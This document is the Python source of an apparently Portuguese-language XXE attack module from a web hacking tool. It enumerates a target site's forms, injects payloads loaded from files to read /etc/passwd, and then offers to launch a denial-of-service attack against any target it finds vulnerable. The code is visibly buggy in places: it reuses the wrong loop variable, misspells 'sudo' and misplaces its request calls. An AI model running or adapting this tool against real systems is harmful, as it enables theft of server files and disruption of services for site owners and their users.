# !/usr/bin python3
try:  
    from core import colors as color
    from datetime import datetime
    from core.utils import exitTheProgram
    from core.utils import avaregeTime
    try:
        from bs4 import BeautifulSoup
    except ImportError as e:
        ####################
        import os          #
        ####################
        print(color.falta+"[", datetime.now() ,"] BeautifullSoup não está instalada...");
        print(color.info+"[", datetime.now() ,"] Instalando o módulo BeautifullSoup...")
        os.system("sudpo apt-get install python3-bs4 | pip install beautifulsoup4")
        print(color.info+"[", datetime.now() ,"] BeautifullSoup instalado")
        quit()
        
    def _xxe(target_url, proxy, timeout, verbose, headers, data, http_enumeration):
                
        print("["+color.green+"!"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]"+color.end+"  Modo de"+color.orange+" deteção Xpath xml entity"+ color.end+" passada para o alvo "+color.orange+target_url+color.end)
        ################################################################################
        from core.utils import checkURLIntegrity ## testando a estabilidade de conexão #
        checkURLIntegrity(target_url)                                                  #
        ################################################################################
        try:
            '''
            testando os parâmentros (Tal como um constructor) ???
            '''
            if not headers:
                ####################################
                from core.config import HEADERS    #
                ####################################
                headers = HEADERS
            else:
                pass
            if not timeout:
                ##########################################
                from core.config import DEFAULT_TIMEOUT  #
                ##########################################
                timeout = DEFAULT_TIMEOUT
            else:
                pass
            if not proxy:
                #####################################
                from core.config import PROXIES_    #
                #####################################
                proxy = PROXIES_
            else:
                pass
            if not data:
                ####################################################
                from core.config import INITIAL_FORM_COUNT_VALUE   #
                ####################################################
                print("["+color.green+"~"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Testando a estabilidade da conexão, pode levar alguns minutos...")
                if(avaregeTime(target_url) >= INITIAL_FORM_COUNT_VALUE):
                    print(color.orange+"[!]["+color.admin_side, datetime.now(), "]   Aviso: A sua conexão parece estar instável, recomenda-se que se tenha uma conexão estável."+color.end, end='')
                    user_option = str(input(" Deseja continuar? (sim/nao): "))
                    if user_option.lower() == 'sim':
                        pass
                    elif user_option.lower() == 'nao':
                        print(color.end+"[!][", datetime.now() ,"] Aviso: Terminando o teste..."+color.end, end='')
                        exitTheProgram()
                    else:
                        print(color.red+"[!][", datetime.now() ,"]  Erro: Entrada inválida, "+ color.end)
                        exitTheProgram()
                else:
                    print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Conexão estável ")
                    pass 
                ###################
                import requests   #
                ###################
                print("["+color.green+"*"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Enumerando Formulários...") 
                initial_request = requests.get(url=target_url, timeout=timeout, headers=headers)
                initial_request_parsed = BeautifulSoup(initial_request.content, 'html.parser')
                ## filrando os formulários...
                form_tag = initial_request_parsed.find_all('form')

                if form_tag:
                    pass
                else:
                    print(color.orange+"[!][", datetime.now() ,"]  Aviso:  O alvo  não contêm campos onde se possa introduzir dados..."+color.end)
                    if not http_enumeration:
                        try:
                            print(color.admin_side+"[!][", datetime.now() ,"]"+color.white, end='')
                            user_choise = str(input("  Deseja fazer uma enumeração em cabeçalhos http?(sim/nao):"))
                            if user_choise == "sim":
                                #########################################################################################
                                from mode.plugin.headerEnum import headerEnumeration ## enumerando e esplorando headers #
                                headerEnumeration(target_url)                                                           #
                                exitTheProgram()
                                #########################################################################################
                            else:
                                exitTheProgram()
                        except ValueError:
                          print(color.red+"[!][", datetime.now() ,"]  Erro: Valor inválido"+color.endswith)
                          exitTheProgram()
                input_dic  = {}
        
                ########################################
                from core.utils import formEnum        #
                user_option = formEnum(form_tag)       #
                ########################################
    
                
                for user_option_perc in range(INITIAL_FORM_COUNT_VALUE):
                    '''
                    try:
                        post_target_url = url_exploded[0]+'//'+url_exploded[2]+'/'+validation_page[user_option]
                    except KeyError:
                        print(color.red+"[!][", datetime.now() ,"] Erro: Quantidade inválida.")
                        exitTheProgram()
                    '''
                    print("["+color.green+"+"+color.end+"]" +color.end+"["+color.admin_side, datetime.now(), color.end+"]  Filtrando os Possíveis campos vulneráveis...."+color.end+ " no formulário na posição "+color.cian,user_option,color.end)
                    
                    ############################################
                    from core.utils import arrayForm           #
                    array_form_return = arrayForm(form_tag)    #
                    ############################################
                    
                    input_tag = array_form_return[user_option].find_all({'input'})
                    
                    try:
                        with open('./mode/payload/xxe/include_file.txt', 'r')  as payloads:
                            for lines in payloads:
                                print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"][Enumerando]"+color.cian, lines, color.end)
                                for input_tag_perc in input_tag:
                                    if 'type' in input_tag_perc.attrs:
                                        if 'checkbox' in input_tag_perc.attrs['type']:
                                            pass
                                        elif 'name' in input_tag_perc.attrs:
                                            input_dic[input_tag_perc.attrs['name']] = lines
                            main_requesition = requests.post(url=target_url, data=input_dic)
                            if "export PATH" in main_requesition.text.lower():
                                ## caso seja verdadeiro, dando outrass opções
                                print("["+color.green+"+"+color.end+"]" +color.end+"["+color.admin_side, datetime.now(), color.end+"] Alvo vulnerável a falha xxr,"+color.end+ " no formulário na posição "+color.cian,user_option,color.end, end='')
                                try:
                                    user_choise_atack = str(input(" dejesa lançar o ataque de negação de serviço contra o alvo?(sim/nao):"))
                                    if user_choise_atack.lower() == "sim":
                                        ##################################################################
                                        ## ler o código de retorno http para ataque de negação de serviço#
                                        ##################################################################
                                        print("\n["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"] Enviando payloads de "+color.cian+"negação de serviço"+color.end)       
                                        with open('./mode/payload/xxe/dos.txt', 'r') as dos_payloads:
                                            for dos_lines in dos_payloads:
                                                for input_tag_perc in input_tag:
                                                    if 'type' in input_tag_perc.attrs:
                                                        if 'checkbox' in input_tag_perc.attrs['type']:
                                                            pass
                                                        elif 'name' in input_tag_perc.attrs:
                                                            input_dic[input_tag_perc.attrs['name']] = lines
                                        main_requesition = requests.post(url=target_url, data=input_dic)
                                        ##################################################################
                                        ## ler o código de retorno http para ataque de negação de serviço#
                                        ##################################################################
                                    pass
                                except ValueError as e:
                                    print(color.red+"[!][", datetime.now() ,"] Erro: Valor inválida."+color.end)
                                    exitTheProgram()
                                break
                            else:
                                print("["+color.red+"-"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]["+color.red+"Bloqueado"+color.end+"]"+ color.cian, lines+color.end, end='')
                                pass      
                        with open('./mode/payload/xxe/get_etc.txt', 'r') as etc_passwd_payload:
                            for etc_passwd_lines in etc_passwd_payload:
                                    print("\n["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"][Enumerando]"+color.cian, etc_passwd_lines, color.end)
                                    for input_tag_perc in input_tag:
                                        if 'type' in input_tag_perc.attrs:
                                            if 'checkbox' in input_tag_perc.attrs['type']:
                                                pass
                                            elif 'name' in input_tag_perc.attrs:
                                                input_dic[input_tag_perc.attrs['name']] = lines
                                    main_requesition = requests.post(url=target_url, data=input_dic)
                                    if "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin" in main_requesition.text.lower():
                                        print("["+color.green+"+"+color.end+"]" +color.end+"["+color.admin_side, datetime.now(), color.end+"] Alvo vulnerável a falha xxr,"+color.end+ " no formulário na posição "+color.cian,user_option,color.end, end='')
                                        try:
                                            user_choise_atack = str(input(" dejesa lançar o ataque de negação de serviço contra o alvo?(sim/nao):"))
                                            if user_choise_atack.lower() == "sim":
                                                ######################################
                                                #Lançado ataque de negação de serviço#
                                                ######################################
                                                print("\n["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"] Enviando payloads de "+color.cian+"negação de serviço"+color.end)       
                                                with open('./mode/payload/xxe/dos.txt', 'r') as dos_payloads:
                                                    for dos_lines in dos_payloads:
                                                        for input_tag_perc in input_tag:
                                                            if 'type' in input_tag_perc.attrs:
                                                                if 'checkbox' in input_tag_perc.attrs['type']:
                                                                    pass
                                                                elif 'name' in input_tag_perc.attrs:
                                                                    input_dic[input_tag_perc.attrs['name']] = lines
                                                main_requesition = requests.post(url=target_url, data=input_dic)
                                                ###################################################################
                                                ## ler o código de retorno http para ataque de negação de serviço##
                                                ###################################################################
                                            pass
                                        except ValueError as e:
                                            print(color.red+"[!][", datetime.now() ,"] Erro: Valor inválida."+color.end)
                                            exitTheProgram()
                                        break
                                    else:
                                        print("["+color.red+"-"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]["+color.red+"Bloqueado"+color.end+"]"+ color.cian, etc_passwd_lines+color.end, end='')  
                                        pass
                        print(color.white+"\n[+][",datetime.now(),"] O Web spider não encontrou nenhum ponto vulnerável no alvo, o alvo deve estar sendo protegido por WAF, ou outros mecanismos de Segurança."+color.end)
                        exitTheProgram()
                    except FileNotFoundError as e:
                        print(color.red+"[!][", datetime.now() ,"] Erro:  Arquivo xxe-payload não encontrado"+color.end)
                        exitTheProgram()
            else:
                '''
                Executa o modo de ação usando os payloads nativos do programa
                '''
                return 
        except requests.exceptions.RequestException as e:
            print(color.red+"[!][", datetime.now() ,"] Erro: alvo Inacessível, verifique a sua ligação à internet ou contacte o Web master."+color.end)
            exitTheProgram()
except KeyboardInterrupt as e:
     print(color.red+"\n[!][", datetime.now() ,"] Interrupção pela parte do usuário "+color.end)
     exitTheProgram()
    